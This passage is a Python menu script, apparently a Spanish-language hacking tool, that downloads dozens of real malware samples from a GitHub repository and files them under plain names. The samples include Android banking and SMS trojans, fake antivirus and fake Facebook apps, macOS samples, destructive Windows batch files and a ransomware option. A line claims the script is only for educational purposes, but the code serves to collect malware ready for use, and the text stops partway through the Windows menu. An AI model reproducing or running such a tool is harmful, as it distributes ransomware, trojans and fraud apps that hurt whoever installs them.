#!/usr/bin/python
# -*- coding: utf-8 -*-
##### Este script es solo para fines educativos. El autor no es responsable de ningun problema o daño causado por este scriptt########

import sys,os,platform
from time import *
x = platform.system()
import requests
from tqdm import tqdm
	#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
GR  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
fun = "Carga Completada Disfrute...,By Carlober. "

now = strftime("%T")
bulan = strftime("%B")
tahun = strftime("%Y")
#--- Def menu ---#
def banner():
    os.system('printf "                _            ___  _        ___\t\t \n\t\t|     |   | [  /  | |   | [___\n\t\t|___] |___|   /__]| |___|  ___]\n\t\t  \n\n  " | lolcat')     
    
#####░█████╗░░█████╗░██████╗░██╗░░░░░░█████╗░██████╗░███████╗██████╗░
#####██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔════╝██╔══██╗
#####██║░░╚═╝███████║██████╔╝██║░░░░░██║░░██║██████╦╝█████╗░░██████╔╝
#####██║░░██╗██╔══██║██╔══██╗██║░░░░░██║░░██║██╔══██╗██╔══╝░░██╔══██╗
#####╚█████╔╝██║░░██║██║░░██║███████╗╚█████╔╝██████╦╝███████╗██║░░██║
#####░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝




def about():
	print("\t\t"+B+"<<<<<<| "+R+"About Tool "+B+"|>>>>>>\n")
	print("\t"+G+"Made"+B+" with full"+R+" <3"+B+"\t\t")
	print("\tAuthor  : Carlober\t\t\t")
	print("\tVersion : 1.1\t\t\t")
	print("\tTeam    : "+R+"Solo Sin Equipo")
	print("\t"+B+"Gracias por usar esta Herramienta")
	menu()
	
def banner2():
	print(""+GR+"")
	
def fontcolor():
	print(""+W+"")
#######NO CAMBIES ESTO#########

#################### START ANDROID
def Vandroid():
	print(""+GR+"["+R+"1"+GR+"] Agent\t\t["+R+"15"+GR+"] Elite\t\t["+R+"29"+GR+"] Prasesfee")
	print(""+GR+"["+R+"2"+GR+"] Badnews\t\t["+R+"16"+GR+"] Omigo\t\t["+R+"30"+GR+"] RecipeSmart")
	print(""+GR+"["+R+"3"+GR+"] Bios\t\t["+R+"17"+GR+"] Opfake\t\t["+R+"31"+GR+"] Romaticpos")
	print(""+GR+"["+R+"4"+GR+"] BlatanSMS\t\t["+R+"18"+GR+"] SmsWorker\t\t["+R+"32"+GR+"] Statetss")
	print(""+GR+"["+R+"5"+GR+"] BrainTest\t\t["+R+"19"+GR+"] Vietcon\t\t["+R+"33"+GR+"] Thinking")
	print(""+GR+"["+R+"6"+GR+"] Claco\t\t["+R+"20"+GR+"] Candycorn\t\t["+R+"34"+GR+"] Crd")
	print(""+GR+"["+R+"7"+GR+"] DropDialer\t\t["+R+"21"+GR+"] Cat\t\t["+R+"35"+GR+"] Dendroid")
	print(""+GR+"["+R+"8"+GR+"] FakeBank\t\t["+R+"22"+GR+"] Chistescortos\t["+R+"36"+GR+"] Ds")
	print(""+GR+"["+R+"9"+GR+"] FakeCMCC\t\t["+R+"23"+GR+"] Chistespicanticos\t["+R+"37"+GR+"] Facebook")
	print(""+GR+"["+R+"10"+GR+"] FakeDoc\t\t["+R+"24"+GR+"] ComFunnys\t\t["+R+"38"+GR+"] Fakeav")
	print(""+GR+"["+R+"11"+GR+"] FakeValidation\t["+R+"25"+GR+"] ComImagePets\t["+R+"39"+GR+"] ArtStation")
	print(""+GR+"["+R+"12"+GR+"] Fobus\t\t["+R+"26"+GR+"] ComKitchen\t\t["+R+"40"+GR+"] MusicPlayer")
	print(""+GR+"["+R+"13"+GR+"] GinMaster\t\t["+R+"27"+GR+"] ComLaughtter\t["+R+"41"+GR+"] Settings")
	print(""+GR+"["+R+"14"+GR+"] Masnu\t\t["+R+"28"+GR+"] Prasesamor\t\t["+R+"42"+GR+"] Back")
	
	try:
		menu1 = input("Input Number > "+R+"")
		if menu1 == 1:#############done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Agent.apk?raw=true' Android/Agent.apk")
			print(fun)######done
			
		elif menu1 == 2:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BadNews.A.apk?raw=true' Android/BadNews.apk")
			print(fun)#######done
		
		elif menu1 == 3:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Bios.NativeMaliciousCode.apk?raw=true' Android/Bios.apk")
			print(fun)#####done
			
		elif menu1 == 4:########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Blatantsms.apk?raw=true' Android/Blatantsms.apk")
			print(fun)#####done
			
		elif menu1 == 5:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BrainTest.apk?raw=true' Android/BrainTest.apk")
			print(fun)#####done
			
		elif menu1 == 6:##########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Claco.A.apk?raw=true' Android/Claco.apk")
			print(fun)#####done
			
		elif menu1 == 7:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Dropdialer.apk?raw=true' Android/DropDialer.apk")
			print(fun)#####done
			
		elif menu1 == 8:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeBank.B.apk?raw=true' Android/FakeBank.apk")
			print(fun)#####done
			
		elif menu1 == 9:######done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeCMCC.A.apk?raw=true' Android/FakeCMCC.apk")
			print(fun)#####done
		
		elif menu1 == 10:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeDoc.apk?raw=true' Android/FakeDoc.apk")
			print(fun)#####done
			
		elif menu1 == 11:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeValidation.apk?raw=true' Android/FakeValidation.apk")
			print(fun)#####done
			
		elif menu1 == 12:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Fobus.apk?raw=true' Android/Fobus.apk")
			print(fun)#####done
			
		elif menu1 == 13:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' Android/GinMaster.apk")
			print(fun)#####done
			
		elif menu1 == 14:###done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Masnu.apk?raw=true' Android/Masnu.apk")
			print(fun)#####done
			
		elif menu1 == 15:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Minecraft2.apk?raw=true' Android/Elite.apk")
			print(fun)#####done
			
		elif menu1 == 16:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Omigo.apk?raw=true' Android/Omigo.apk")
			print(fun)#####done
			
		elif menu1 == 17:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Opfake.apk?raw=true' Android/Opfake.apk")
			print(fun)#####done
			
		elif menu1 == 18:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'SmsWorker.apk?raw=true' Android/SmsWorker.apk")
			print(fun)#####done
			
		elif menu1 == 19:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Vietcon.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Vietcon.apk?raw=true' Android/Vietcon.apk")
			print(fun)#####done
			
		elif menu1 == 20:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/candy_corn.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'candy_corn.apk?raw=true' Android/Candycorn.apk")
			print(fun)#####done
			
		elif menu1 == 21:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cat.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'cat.apk?raw=true' Android/Cat.apk")
			print(fun)#####done
			
		elif menu1 == 22:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistescortos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'chistescortos.apk?raw=true' Android/Chistescortos.apk")
			print(fun)#####done
			
		elif menu1 == 23:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistespicanticos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'chistespicanticos.apk?raw=true' Android/Chistespicanticos.apk")
			print(fun)#####done
			
		elif menu1 == 24:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.funnyys.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.funnyys.apk?raw=true' Android/ComFunnys.apk")
			print(fun)#####done
			
		elif menu1 == 25:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.imagepets.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.imagepets.apk?raw=true' Android/ComImagePets.apk")
			print(fun)#####done
			
		elif menu1 == 26:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.kitchenn.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.kitchenn.apk?raw=true' Android/ComKitchen.apk")
			print(fun)#####done
			
		elif menu1 == 27:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.laughtter.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.laughtter.apk?raw=true' Android/ComLaughtter.apk")
			print(fun)#####done
			
		elif menu1 == 28:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesamor.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.prasesamor.apk?raw=true' Android/Prasesamor.apk")
			print(fun)#####done
			
		elif menu1 == 29:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesfee.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.prasesfee.apk?raw=true' Android/Prasesfee.apk")
			print(fun)#####done
			
		elif menu1 == 30:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.recipesmart.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.recipesmart.apk?raw=true' Android/Recipesmart.apk")
			print(fun)#####done
			
		elif menu1 == 31:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.romaticpos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.romaticpos.apk?raw=true' Android/Romaticpos.apk")
			print(fun)#####done
			
		elif menu1 == 32:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.statetss.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.statetss.apk?raw=true' Android/Statetss.apk")
			print(fun)#####done
			
		elif menu1 == 33:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.thinkking.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.thinkking.apk?raw=true' Android/Thinkking.apk")
			print(fun)#####done
			
		elif menu1 == 34:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/crd.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'crd.apk?raw=true' Android/Crd.apk")
			print(fun)#####done
			
		elif menu1 == 35:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/dendroid.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'dendroid.apk?raw=true' Android/Dendroid.apk")
			print(fun)#####done
			
		elif menu1 == 36:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ds.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ds.apk?raw=true' Android/Ds.apk")
			print(fun)#####done
			
		elif menu1 == 37:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/facebook.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'facebook.apk?raw=true' Android/Facebook.apk")
			print(fun)#####done
			
		elif menu1 == 38:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fake_av.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Fake_av.apk?raw=true' Android/Fakeav.apk")
			print(fun)#####done
			
		elif menu1 == 39:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ArtStation.apk?raw=true' Android/ArtStation.apk")
			print(fun)#####done
			
		elif menu1 == 40:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Adware.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Adware.apk?raw=true' Android/MusicPlayerAdware.apk")
			print(fun)#####done
			
		elif menu1 == 41:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Settings.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Settings.apk?raw=true' Android/Settings.apk")
			print(fun)#####done		
			
		elif menu1 == 42:####done
			print("\n")
			menu()
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
#################ANDROID DONE

#################Start Macosx
def Vmacosx():
	print(""+GR+"["+R+"1"+GR+"] Trinoids")
	print(""+GR+"["+R+"2"+GR+"] Nothing")
	print(""+GR+"["+R+"3"+GR+"] Back")
	
	try:
		menu2 = input("Input number > "+R+"")
		if menu2 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'trinoids.app?raw=true' Macosx/Trinoids.app")
			print(fun)#####done
		
		elif menu2 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/nothing.app?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'nothing.app?raw=true' Macosx/Nothing.app")
			print(fun)#####done
		elif menu2 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] wrong number")
	except Exception:
		print(""+R+"[!] This is not number")
####################Done Macosx	

###################Start PC
def vpcwin():
	print(""+GR+"["+R+"1"+GR+"] Ugly.bat\t\t["+R+"5"+GR+"] Koce.bat\t\t["+R+"9"+GR+"] Ransomeware")
	print(""+GR+"["+R+"2"+GR+"] Sleepy.bat\t\t["+R+"6"+GR+"] Cmd.bat\t\t["+R+"10"+GR+"] Rip.bat")
	print(""+GR+"["+R+"3"+GR+"] Reg-eater.bat\t["+R+"7"+GR+"] Capslock.vbs\t["+R+"11"+GR+"] Back")
	print(""+GR+"["+R+"4"+GR+"] Kuis.bat\t\t["+R+"8"+GR+"] Alay.vbs")

	try:	
		menu3 = input("Input number > "+R+"")
		if menu3 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ugly.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ugly.bat?raw=true' Windows/Ugly.bat")
			print(fun)#####done
			
		elif menu3 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/sleepy.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'sleepy.bat?raw=true' Windows/Sleepy.bat")
			print(fun)#####done
			
		elif menu3 == 3:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/reg-eater.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'reg-eater.bat?raw=true' Windows/Reg-eater.bat")
			print(fun)#####done
			
		elif menu3 == 4:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/kuis.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'kuis.bat?raw=true' Windows/Kuis.bat")
			print(fun)#####done
			
		elif menu3 == 5:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/koce.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'koce.bat?raw=true' Windows/Koce.bat")
			print(fun)#####done
			
		elif menu3 == 6:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cmd.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'cmd.bat?raw=true' Windows/Cmd.bat")
			print(fun)#####done
			
		elif menu3 == 7:
			print(""+G+"")
			chunk_size = 1024
